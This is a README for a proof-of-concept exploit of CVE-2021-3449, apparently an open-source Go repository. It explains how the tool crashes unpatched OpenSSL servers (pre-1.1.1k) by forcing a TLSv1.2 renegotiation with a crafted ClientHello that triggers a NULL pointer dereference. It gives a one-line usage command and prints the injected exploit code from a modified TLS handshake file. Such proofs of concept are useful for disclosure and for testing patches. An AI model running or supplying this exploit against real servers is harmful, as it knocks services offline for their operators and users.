# CVE-2021-3449 PoC exploit

Usage: `go run . -host hostname:port`

This program implements a proof-of-concept exploit of CVE-2021-3449
affecting OpenSSL servers pre-1.1.1k if TLSv1.2 secure renegotiation is accepted.

It connects to a TLSv1.2 server and immediately initiates an RFC 5746 "secure renegotiation".
The attack involves a maliciously-crafted `ClientHello` that causes the server to crash
by causing a NULL pointer dereference (Denial-of-Service).

## Implementation

`main.go` is a tiny script that connects to a TLS server, forces a renegotiation, and disconnects.

The exploit code was injected into a bundled version of the Go 1.14.15 `encoding/tls` package.
You can find it in `handshake_client.go:115`. The logic is self-explanatory.

```go
// CVE-2021-3449 exploit code.
if hello.vers >= VersionTLS12 {
    if c.handshakes == 0 {
        println("initial handshake")
        hello.supportedSignatureAlgorithms = supportedSignatureAlgorithms
    } else {
        // OpenSSL pre-1.1.1k runs into a NULL-pointer dereference
        // if the supported_signature_algorithms extension is omitted,
        // but supported_signature_algorithms_cert is present.
        println("malicious handshake")
        hello.supportedSignatureAlgorithmsCert = supportedSignatureAlgorithms
    }
}
```

– terorie


This repository bundles the `encoding/tls` package of the Go programming language.

```
// Copyright 2009 The Go Authors. All rights reserved.
// Use of this source code is governed by a BSD-style
// license that can be found in the LICENSE file.
```
